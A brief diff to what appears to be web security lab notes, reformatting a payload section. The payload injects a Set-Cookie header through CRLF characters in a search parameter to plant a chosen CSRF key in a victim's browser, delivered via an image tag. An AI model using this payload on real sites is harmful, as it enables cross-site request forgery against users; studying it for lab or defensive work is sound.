@@ -6,4 +6,4 @@
 # Payload
 
 - `/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None` can use to force change stored cookies of victim.
-- use <img src=''> tag to load the above payload to set cookie into victim browser
+- use `<img src=''>` tag to load the above payload to set cookie into victim browser
